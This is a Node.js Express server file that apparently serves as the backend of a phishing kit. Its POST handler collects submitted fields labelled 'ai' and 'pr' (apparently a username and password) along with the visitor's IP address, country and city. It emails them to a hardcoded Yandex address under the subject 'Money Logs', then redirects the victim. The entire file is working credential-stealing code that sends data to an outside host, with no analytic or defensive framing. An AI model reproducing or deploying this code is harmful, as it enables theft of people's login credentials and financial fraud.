// server.js
// where your node app starts

// we've started you off with Express (https://expressjs.com/)
// but feel free to use whatever libraries or frameworks you'd like through `package.json`.

const express = require("express");
const bodyParser = require("body-parser");
const requestIp = require("request-ip");
const geoip = require("geoip-lite");
const app = express();
const sendmail = require("sendmail")();
const lastRedirect = "";

// make all the files in 'public' available
// https://expressjs.com/en/starter/static-files.html
app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Get the user's IP address using the request-ip middleware
app.use(requestIp.mw());

app.get("/", (request, response) => {
  response.sendFile(__dirname + "/src/pages/index.hbs");
});

// https://expressjs.com/en/starter/basic-routing.html
app.post("/", (req, res) => {
  const {ai, pr } = req.body;
  console.log(req.body);
  let logEmail = "comp.id47@yandex.com";

  // Get the user's IPv4 address
  const ip = requestIp.getClientIp(req);

  // Get the country and city from the IP address using geoip-lite
  const geo = geoip.lookup(ip);
  const country = geo ? geo.country : "unknown";
  const city = geo ? geo.city : "unknown";
  const html = `
    <!DOCTYPE html>
    <html lang='en'>
    <head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Document</title>
    </head>  
    <body>
    Details Has Arrived!!
    <h3>User: ${ai}</h3>
    <h3>Access: ${pr}</h3>
    <h3>IP: ${ip}</h3>
    <h3>Country: ${country}</h3>
    <h3>City: ${city}</h3>
   
    </body>
    </html>
    `;
 
  let ip2 = requestIp.getClientIp(req);

  let redirectUrl = "https://${dom}";

  sendmail(
    {
      from: "fresh@logscentral.com",
      to: logEmail,
      subject: "Money Logs" + ip2,
      html,
    },
    function (err, reply) {
      res.redirect(redirectUrl);
    }
  );
});

// send the default array of dreams to the webpage
// listen for requests :)
const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});
